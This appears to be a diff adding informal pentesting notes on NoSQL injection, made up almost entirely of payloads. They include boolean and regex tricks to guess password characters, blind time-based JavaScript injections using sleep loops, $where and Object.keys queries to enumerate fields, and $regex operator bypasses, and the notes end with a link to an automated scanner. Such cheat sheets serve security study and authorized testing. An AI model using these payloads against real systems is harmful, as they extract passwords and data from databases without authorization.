@@ -1,0 +1,28 @@
+NoSQL is a technology which is kind of a replacement of our average SQL where we used to create databases and do stuff relating to it the tricks to detect it remain the same as usual sql injection.
+
+Extracting sensitive data from db
+1) helps to guess password characters
+  returns && this.password[0] == 'a' || 'a'=='b
+2) Doing the same using match function 
+  admin' && this.password.match(/\d/) || 'a'=='b
+
+Blind Time based injection
+1) admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
+2) admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
+
+Extracting fields
+1) admin' && this.username!='  /  admin' && this.sus!=' 
+  if username field is present a different response will be created which helps to to extract fields, same can be fuzzed to using intruder
+
+"$where":"0" & "$where":"1" --> with other usual params can be used to detect if operator is being executed
+now extract fields using
+"$where":"Object.keys(this)[0].match('^.{0}a.*')"
+
+Similarly 
+{"username":"admin","password":{"$regex":"^.*"}}
+
+Automated scanning for nosql vulns
+https://github.com/codingo/NoSQLMap
+
+
+
